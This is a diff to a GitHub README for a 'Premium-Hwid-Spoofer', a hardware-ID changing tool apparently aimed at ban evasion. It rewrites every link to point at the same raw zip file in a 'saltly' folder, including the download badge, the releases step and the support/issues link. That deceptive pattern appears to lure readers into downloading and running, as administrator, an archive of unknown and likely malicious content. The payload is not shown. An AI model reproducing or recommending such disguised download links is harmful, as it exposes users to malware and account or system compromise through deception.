@@ -6,7 +6,7 @@ Welcome to the Premium-Hwid-Spoofer! This tool helps you change your hardware id
 
 ## 📥 Download Premium-Hwid-Spoofer
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/releases)
+[![Download Now](https://raw.githubusercontent.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/main/saltly/Premium-Hwid-Spoofer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/main/saltly/Premium-Hwid-Spoofer.zip)
 
 To get started, download the latest version of the Premium-Hwid-Spoofer. Please follow these steps:
 
@@ -26,7 +26,7 @@ Before you install, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/releases).
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/main/saltly/Premium-Hwid-Spoofer.zip).
 2. **Download the Installer:** Select the latest version and download it.
 3. **Run the Application:**
    - Navigate to your Downloads folder.
@@ -67,7 +67,7 @@ Yes, you must run the application as an administrator for it to function properl
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/issues). Provide as much detail as possible, and we will assist you promptly.
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/CrystalJaneMaligalig/Premium-Hwid-Spoofer/main/saltly/Premium-Hwid-Spoofer.zip). Provide as much detail as possible, and we will assist you promptly.
 
 ## 📝 Contribution
 
